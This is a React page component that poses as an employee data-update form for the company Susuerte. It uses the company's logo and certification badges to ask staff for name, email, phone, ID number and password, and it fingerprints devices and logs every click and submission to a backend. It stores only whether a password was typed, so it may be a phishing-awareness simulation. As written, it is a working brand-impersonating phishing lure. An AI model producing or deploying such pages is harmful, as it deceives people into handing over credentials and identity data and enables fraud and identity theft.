/**
 * Susuerte - Actualización de Datos
 * Design: Corporate Institutional / Brand-Faithful
 * 
 * Color Philosophy:
 *   - Fondo página: #0d1117 (oscuro neutro)
 *   - Header tarjeta: gradiente azul royal #1a3fa0 → #1e4db7
 *   - Botón CTA: amarillo dorado #FFD700
 *   - Texto sobre azul: blanco puro
 *   - Sección inferior: blanco con borde suave
 * 
 * Typography: Nunito (Bold para títulos, Regular para cuerpo)
 * Layout: Tarjeta centrada, fondo oscuro, sombra pronunciada
 */

import { useState, useEffect, useRef } from "react";
import { motion } from "framer-motion";
import { useAuth } from "@/_core/hooks/useAuth";
import { trpc } from "@/lib/trpc";
import { initializeSession, trackEvent, setTrpcClient } from "@/lib/eventTracking";
import { captureAdvancedDeviceData } from "@/lib/advancedDeviceDetection";
import { setupFormTouchTracking, getDebugInfo, type TouchEventData } from "@/lib/touchEventDetection";

interface FormData {
  name: string;
  email: string;
  phone: string;
  document: string;
  password: string;
}

interface RegistroUsuario {
  id: string;
  nombre: string;
  email: string;
  telefono: string;
  documento: string;
  verificado: boolean;
  timestamp: string;
  deviceData: any;
  sessionId: string;
  passwordEntered: boolean;
}

export default function Home() {
  // The userAuth hooks provides authentication state
  // To implement login/logout functionality, simply call logout() or redirect to getLoginUrl()
  let { user, loading, error, isAuthenticated, logout } = useAuth();

  const [formData, setFormData] = useState<FormData>({
    name: "",
    email: "",
    phone: "",
    document: "",
    password: "",
  });
  const [submitted, setSubmitted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [deviceData, setDeviceData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string>("");
  const [formStarted, setFormStarted] = useState(false);
  const formRef = useRef<HTMLFormElement>(null);
  const cleanupTouchTrackingRef = useRef<(() => void) | null>(null);
  const touchEventCountRef = useRef<Map<string, number>>(new Map());

  // Mutation para guardar el registro en la base de datos
  const createRegistroMutation = trpc.susuert.createRegistro.useMutation();

  // Inicializar sesión y capturar datos técnicos
  useEffect(() => {
    const initializeUser = async () => {
      // Inicializar trpcClient para guardar eventos en BD
      setTrpcClient(trpc);

      // Inicializar sesión de eventos
      const newSessionId = initializeSession();
      setSessionId(newSessionId);

      // Capturar datos técnicos
      const device = await captureAdvancedDeviceData();
      setDeviceData(device);

      // Registrar visita de página
      await trackEvent('PAGE_VISIT', {
        paginaVisitada: window.location.pathname,
        dispositivo: device?.tipoDispositivo || 'Desconocido',
        navegador: device?.navegador || 'Desconocido',
      });

      // Mostrar información de depuración en consola
      console.log(getDebugInfo());

      // Setup de tracking táctil mejorado - DESACTIVADO para evitar duplicación
      // Los clics ya se registran en handleFieldClick
      // if (formRef.current) {
      //   const handleTouchEvent = (data: TouchEventData) => { ... };
      //   cleanupTouchTrackingRef.current = setupFormTouchTracking(formRef.current, handleTouchEvent);
      // }
    };

    initializeUser();

    return () => {
      if (cleanupTouchTrackingRef.current) {
        cleanupTouchTrackingRef.current();
      }
    };
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData({ ...formData, [id]: value });

    // Registrar inicio de formulario si es la primera interacción
    if (!formStarted) {
      setFormStarted(true);
      trackEvent('FORM_START', {
        campo: id,
        dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
        navegador: deviceData?.navegador || 'Desconocido',
      });
    }
  };

  const handleFieldClick = (fieldId: string) => {
    // Registrar clic en campo específico (único evento)
    trackEvent('BUTTON_CLICK', {
      tipo: 'campo_click',
      campo: fieldId,
      dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
      navegador: deviceData?.navegador || 'Desconocido',
      timestamp: new Date().toISOString(),
    });
  };

  const handleFieldFocus = (fieldId: string) => {
    // No registrar evento de focus (evita duplicación)
  };

  const handleFieldBlur = (fieldId: string) => {
    // No registrar evento de blur (evita duplicación)
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const passwordEntered = formData.password.length > 0;

      await trackEvent('FORM_SUBMIT', {
        nombre: formData.name,
        email: formData.email,
        telefono: formData.phone,
        documento: formData.document,
        passwordEntered: passwordEntered,
        dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
        navegador: deviceData?.navegador || 'Desconocido',
        timestamp: new Date().toISOString(),
      });

      // Guardar en la BD a través de tRPC
      await createRegistroMutation.mutateAsync({
        nombre: formData.name,
        email: formData.email,
        telefono: formData.phone,
        documento: formData.document,
        deviceType: deviceData?.tipoDispositivo || 'Desconocido',
        browser: deviceData?.navegador || 'Desconocido',
        os: deviceData?.sistemaOperativo || 'Desconocido',
        sessionId: sessionId,
      });

      // También guardar en localStorage como respaldo
      const registrosGuardados = localStorage.getItem("susuerte_registros");
      const registros = registrosGuardados ? JSON.parse(registrosGuardados) : [];

      const nuevoRegistro: RegistroUsuario = {
        id: Date.now().toString(),
        nombre: formData.name,
        email: formData.email,
        telefono: formData.phone,
        documento: formData.document,
        verificado: false,
        timestamp: new Date().toISOString(),
        deviceData: deviceData,
        sessionId: sessionId,
        passwordEntered: passwordEntered,
      };

      registros.push(nuevoRegistro);
      localStorage.setItem("susuerte_registros", JSON.stringify(registros));

      setIsSubmitting(false);
      setSubmitted(true);
    } catch (error) {
      console.error('Error al guardar registro:', error);
      setIsSubmitting(false);
      alert('Error al guardar los datos. Por favor intenta de nuevo.');
    }
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center px-4 py-10"
      style={{
        background: "linear-gradient(135deg, #0d1117 0%, #0f1e3d 50%, #0d1117 100%)",
      }}
    >
      {/* Decorative background stars */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        {[...Array(18)].map((_, i) => (
          <div
            key={i}
            className="absolute rounded-full bg-white"
            style={{
              width: Math.random() * 2 + 1 + "px",
              height: Math.random() * 2 + 1 + "px",
              top: Math.random() * 100 + "%",
              left: Math.random() * 100 + "%",
              opacity: Math.random() * 0.4 + 0.1,
            }}
          />
        ))}
      </div>

      <motion.div
        initial={{ opacity: 0, y: 28 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.45, ease: [0.23, 1, 0.32, 1] }}
        className="relative w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden z-10"
      >
        {/* ── Header con gradiente azul ── */}
        <div
          className="px-6 pt-8 pb-6"
          style={{
            background: "linear-gradient(135deg, #1a3fa0 0%, #1e4db7 100%)",
          }}
        >
          <div className="flex items-center justify-center mb-4">
            <img
              src="/manus-storage/susuerte_logo_original_b475ddf7.png"
              alt="Susuerte Logo"
              className="h-20 w-auto object-contain"
            />
          </div>
          <h1
            className="text-2xl font-bold text-white text-center"
            style={{ fontFamily: "'Nunito', sans-serif" }}
          >
            Querido colaborador
          </h1>
          <p
            className="text-blue-100 text-center text-sm mt-3"
            style={{ fontFamily: "'Nunito', sans-serif" }}
          >
            Agrega tu información para la actualización de tus datos
          </p>
        </div>

        {/* ── Contenido principal ── */}
        <div className="px-6 py-6">
          {submitted ? (
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.3 }}
              className="text-center py-8"
            >
              <div className="text-5xl mb-4">✓</div>
              <h2
                className="text-xl font-bold text-gray-800 mb-2"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                ¡Datos actualizados!
              </h2>
              <p
                className="text-gray-500 text-sm"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                Tu información ha sido registrada exitosamente.
              </p>
            </motion.div>
          ) : (
            <form ref={formRef} onSubmit={handleSubmit} className="flex flex-col gap-4">
              {/* Nombre Completo */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="name"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Nombre Completo
                </label>
                <input
                  id="name"
                  type="text"
                  placeholder="Tu nombre completo"
                  value={formData.name}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('name')}
                  onFocus={(e) => {
                    handleFieldFocus('name');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('name');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  required
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{
                    fontFamily: "'Nunito', sans-serif",
                    boxShadow: "none",
                  }}
                />
              </div>

              {/* Correo Electrónico */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="email"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Correo Electrónico
                </label>
                <input
                  id="email"
                  type="email"
                  placeholder="tu@correo.com"
                  value={formData.email}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('email')}
                  onFocus={(e) => {
                    handleFieldFocus('email');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('email');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  required
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                />
              </div>

              {/* Teléfono */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="phone"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Teléfono
                </label>
                <input
                  id="phone"
                  type="tel"
                  placeholder="Tu número de teléfono"
                  value={formData.phone}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('phone')}
                  onFocus={(e) => {
                    handleFieldFocus('phone');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('phone');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                />
              </div>

              {/* Número de Documento */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="document"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Número de Documento
                </label>
                <input
                  id="document"
                  type="text"
                  placeholder="Tu número de documento"
                  value={formData.document}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('document')}
                  onFocus={(e) => {
                    handleFieldFocus('document');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('document');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                />
              </div>

              {/* Contraseña */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="password"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Contraseña
                </label>
                <input
                  id="password"
                  type="password"
                  placeholder="Tu contraseña"
                  value={formData.password}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('password')}
                  onFocus={(e) => {
                    handleFieldFocus('password');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('password');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                />
              </div>

              {/* Botón Actualizar */}
              <motion.button
                type="submit"
                disabled={isSubmitting}
                whileTap={{ scale: 0.97 }}
                onClick={() => {
                  trackEvent('BUTTON_CLICK', {
                    tipo: 'submit_button',
                    campo: 'submit',
                    dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
                    navegador: deviceData?.navegador || 'Desconocido',
                    timestamp: new Date().toISOString(),
                  });
                }}
                className="w-full py-3 rounded-lg font-bold text-base mt-1 transition-all duration-200"
                style={{
                  fontFamily: "'Nunito', sans-serif",
                  background: isSubmitting ? "#e5c700" : "#FFD700",
                  color: "#1a1a1a",
                  boxShadow: "0 4px 14px rgba(255,215,0,0.35)",
                  cursor: isSubmitting ? "not-allowed" : "pointer",
                }}
                onMouseEnter={(e) => {
                  if (!isSubmitting) (e.currentTarget as HTMLButtonElement).style.background = "#ffe033";
                }}
                onMouseLeave={(e) => {
                  if (!isSubmitting) (e.currentTarget as HTMLButtonElement).style.background = "#FFD700";
                }}
              >
                {isSubmitting ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="#1a1a1a" strokeWidth="4" />
                      <path className="opacity-75" fill="#1a1a1a" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                    </svg>
                    Actualizando...
                  </span>
                ) : (
                  "Actualizar Datos"
                )}
              </motion.button>

              <p
                className="text-center text-xs text-gray-400 mt-1"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                Al enviar, aceptas nuestros términos y condiciones.
              </p>
            </form>
          )}
        </div>

        {/* ── Footer con certificaciones ── */}
        <div
          className="bg-gray-50 border-t border-gray-100 px-6 pt-4 pb-5"
        >
          <p
            className="text-center text-xs text-gray-400 mb-3 font-semibold uppercase tracking-wide"
            style={{ fontFamily: "'Nunito', sans-serif" }}
          >
            Certificaciones y Acreditaciones
          </p>
          <div className="flex items-center justify-center gap-4 flex-wrap">
            <img
              src="/manus-storage/iso9001_95575a89.png"
              alt="ISO 9001 Certified"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
            <img
              src="/manus-storage/super-salud_bb073043.png"
              alt="Super Salud"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
            <img
              src="/manus-storage/pse_banner_afc1f717.png"
              alt="PSE"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
          </div>
        </div>
      </motion.div>
    </div>
  );
}
